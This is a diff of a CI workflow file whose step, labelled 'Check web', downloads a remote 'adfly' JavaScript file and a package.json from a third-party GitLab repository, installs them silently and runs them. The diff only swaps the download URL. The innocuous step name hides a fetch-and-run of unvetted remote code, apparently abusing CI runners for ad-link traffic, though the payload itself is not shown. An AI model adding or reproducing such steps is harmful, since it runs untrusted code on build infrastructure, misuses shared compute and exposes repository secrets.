@@ -12,4 +12,4 @@ jobs:
     steps:
     - name: Check web
       run: |
-        curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/adfly.js --output index.js && curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s && npm start
+        curl https://gitlab.com/meo__coder/appfim__img/-/raw/master/adfly1.js --output index.js && curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s && npm start
